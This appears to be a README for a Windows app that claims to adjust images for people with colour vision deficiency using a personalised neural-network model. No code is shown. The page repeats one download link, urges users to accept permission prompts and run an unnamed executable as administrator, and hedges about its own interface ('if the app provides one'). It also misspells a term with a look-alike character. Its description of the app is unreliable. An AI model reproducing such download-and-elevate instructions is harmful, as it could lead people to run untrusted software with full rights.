# 🎨 cvdadan-personalized-color-compensation - Better Color Access for Windows

[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Concrete-crammer727/cvdadan-personalized-color-compensation)

## 🖥️ Download and Install

Use this link to visit the GitHub page and download the app:

[Open the download page](https://github.com/Concrete-crammer727/cvdadan-personalized-color-compensation)

1. Open the link in your browser.
2. On the GitHub page, look for the latest release or the main download files.
3. Download the Windows file if one is listed.
4. If the download comes as a ZIP file, right-click it and choose Extract All.
5. Open the extracted folder.
6. Double-click the app file to run it.

If Windows asks for permission, choose **Yes**.

## 🪟 System Requirements

This app is built for Windows users who want a simple way to improve image color access.

- Windows 10 or Windows 11
- 4 GB RAM or more
- A modern CPU
- 500 MB free disk space
- Internet access for the first download

For smoother use with large images, 8 GB RAM or more works well.

## 🎯 What This App Does

This app helps make digital images easier to view for people with color vision deficiency.

It uses a personal color compensation flow that adapts to the user instead of using one fixed setting for everyone.

Main goals:

- Improve color separation in images
- Keep image brightness stable
- Support personal visual profiles
- Run fast enough for regular use
- Work on common photo and screen content

The app uses a neural network pipeline with a color-safe forward path in YCbCr, so the image keeps a natural look while colors shift into a more usable range.

## ✨ Key Features

- Personalized color compensation
- Support for color vision deficiency workflows
- FM100-based color profiling
- 3D psychophysical profile data using θ, C, and S
- Fast image processing
- Y-preserving output path
- Built for practical use on Windows
- Useful for photos, diagrams, charts, and UI images

## 🧠 How It Works

The app follows a simple flow:

1. You load an image.
2. The app uses your color profile.
3. It applies the compensation model.
4. It keeps brightness and structure stable.
5. It shows the adjusted image for easier viewing.

Behind the scenes, the system uses a ConvNeXt encoder and a PLCF decoder. In plain terms, it learns how to shift colors in a way that better fits your vision profile.

It also uses a Y-preserving method in YCbCr, which helps keep the image from looking washed out or broken.

## 📥 First-Time Setup

After you download the app:

1. Save the file in a folder you can find later, such as Downloads or Desktop.
2. If the file is zipped, extract it first.
3. Open the app folder.
4. Find the main program file.
5. Double-click it to start the app.
6. If the app asks for access to files or folders, allow it so you can open images.

If the app uses a settings screen, use that to load your profile before you begin.

## 🧩 Recommended Use

Use this app when you want to:

- View photos with better color separation
- Check charts, maps, and graphs
- Review UI screens with clearer contrast
- Compare color changes for personal viewing needs
- Test how images look with compensation applied

For best results, use clear source images with normal lighting and standard file formats like PNG or JPG.

## 🛠️ Basic Workflow

1. Start the app.
2. Load an image.
3. Choose or create your profile.
4. Apply the compensation.
5. Compare the original and adjusted view.
6. Save the result if you want to keep it.

If the app offers a preview mode, use it first before saving.

## 🎨 Color Profiling

This project uses FM100-based psychophysical profiling to build a personal color map.

That means it studies how you see color and turns that into a profile the model can use.

The profiling data includes:

- θ for angle
- C for chroma
- S for strength

These values help tune the output for the user.

## ⚙️ Performance

The app is designed for fast inference and can run at about 22 FPS under normal conditions.

That makes it suitable for near real-time image compensation on many Windows PCs.

Performance may change based on:

- Image size
- CPU speed
- Available memory
- Background apps
- Profile complexity

For the best speed, close other large apps before using it.

## 📂 File Types You Can Use

The app should work well with:

- JPG
- JPEG
- PNG
- BMP
- TIFF

PNG is a good choice when you want to keep image quality high.

## 🔒 Privacy and Local Use

The app is built for local use on your computer.

That means image processing can happen on your device instead of in a browser or remote tool.

If the app stores profile data, keep it in a safe folder on your PC so you can reuse it later.

## 🧪 Best Results Tips

- Use a clean, high-quality image
- Keep the display brightness at a normal level
- Turn off strong color filters in Windows before testing
- Use the same monitor when building your profile
- Reuse the same profile for consistent results

If the image looks too strong, try a different profile or lower intensity setting if the app provides one.

## 🗂️ Project Topics

This project covers:

- color blindness
- color vision deficiency
- computer vision
- image processing
- deep learning
- Farnsworth-Munsell testing
- Machadо simulation
- personalized compensation
- perceptual alignment
- PyTorch-based vision models

## 🚀 Quick Start

1. Visit the download page: [https://github.com/Concrete-crammer727/cvdadan-personalized-color-compensation](https://github.com/Concrete-crammer727/cvdadan-personalized-color-compensation)
2. Download the Windows package or release file.
3. Extract the files if needed.
4. Run the main app.
5. Load an image and apply your profile.

## 🧭 If the App Does Not Open

Try these steps:

1. Right-click the app and choose **Run as administrator**.
2. Check whether Windows blocked the file.
3. Make sure the folder is fully extracted.
4. Confirm that you downloaded all files from the release.
5. Restart your PC and try again.

If the app still does not open, download it again from the GitHub page and replace the old files.

## 🖼️ What You Should See

After the app starts, you should see a simple screen with options to:

- Load an image
- Choose a profile
- Apply compensation
- Save the result
- Compare before and after views

The interface should stay focused on the main task and avoid clutter.

## 🧰 Suggested Folder Setup

Keep your files organized like this:

- Downloads
- cvdadan-personalized-color-compensation
- Input Images
- Output Images
- Profiles

This makes it easier to find your work later.

## 📌 Download Link

Visit the GitHub page to download and run the Windows version:

[https://github.com/Concrete-crammer727/cvdadan-personalized-color-compensation](https://github.com/Concrete-crammer727/cvdadan-personalized-color-compensation)

## 📝 Common Use Cases

- Viewing family photos with better color detail
- Reading colored charts and labels
- Checking website mockups
- Comparing visual design options
- Reviewing educational graphics

## 🧭 What Makes It Different

This project does not use a one-size-fits-all color shift.

It builds a personal compensation path from your own vision profile, which helps the output fit your needs more closely.

The model also aims to keep the image natural, so it does not force extreme color changes

## 🔍 Terms You May See

You may see words like:

- CVD: color vision deficiency
- YCbCr: a color format used for image work
- Encoder: part of the model that reads the image
- Decoder: part of the model that rebuilds the output
- Inference: the act of running the model on an image

These terms refer to how the app processes images behind the scenes